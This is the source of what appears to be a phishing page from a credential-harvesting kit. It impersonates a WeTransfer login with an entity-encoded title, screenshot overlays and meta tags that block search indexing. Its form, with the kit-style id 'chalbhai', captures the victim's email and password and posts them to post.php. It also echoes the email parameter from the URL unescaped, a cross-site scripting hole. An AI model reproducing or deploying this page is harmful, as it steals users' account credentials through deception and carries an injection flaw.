<?php include ('api.php'); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#84;&#114;&#97;&#110;&#115;&#102;&#101;&#114;</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/ico" sizes="16*16" src="images/favicon.ico">
<script type="text/javascript">


function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:659px; z-index:0">
<img src="images/a.png" alt="" title="" width="1366" border="0" height="659">
</div>
<div id="image1" style="position:absolute; overflow:hidden; left:615px; top:160px; width:107px; height:17px; z-index:"><a href="#"><img src="images/b.png" alt="" title="" border=0 width=107 height=17></a></div>
<form id="chalbhai" action="post.php" name="chalbhai" onsubmit="return validateANZ()" method="post">
<div class="textfield textfield--default ">
<input name="login" class="textfield__field" required="required" placeholder="<?php echo $_GET['email']; ?>" value="<?php echo $_GET['email']; ?>" autocomplete="Off" tabindex="1" type="email" style="position:absolute;overflow:hidden;left: 518px;top: 95px;font-weight: 400; font-size: 0.875em;
font-family: -apple-system, .SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif; background-color: transparent; background: #FFFFFF;color: #17181A;border: 0px solid #BABCBF;border-radius: 5px;width:300px;height: 25px;margin-top: 0.625em;position: relative;clear: both; z-index:5" readonly>
</div>

<div class="textfield textfield--default ">
<input name="pass" class="textfield__field" placeholder="Password" autocomplete="Off" tabindex="2" required="required" type="password" style="position:absolute;overflow:hidden;left: 875px;top: 55px;font-weight: 400; font-size: 0.875em;
font-family: -apple-system, .SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif; background-color: transparent; background: #FFFFFF;color: #17181A;border: 0px solid #BABCBF;border-radius: 5px;width:300px;height: 25px;margin-top: 0.625em;position: relative;clear: both; z-index:6" oninvalid="setCustomValidity('Please enter your Password');" oninput="setCustomValidity('')">
</div>
<div id="formimage1" style="position:absolute; left:1218px; top:89px; z-index:6">
<input name="formimage1" src="images/c.png" width="129" type="image" height="51">
</div>
</form>
</body>
</html>


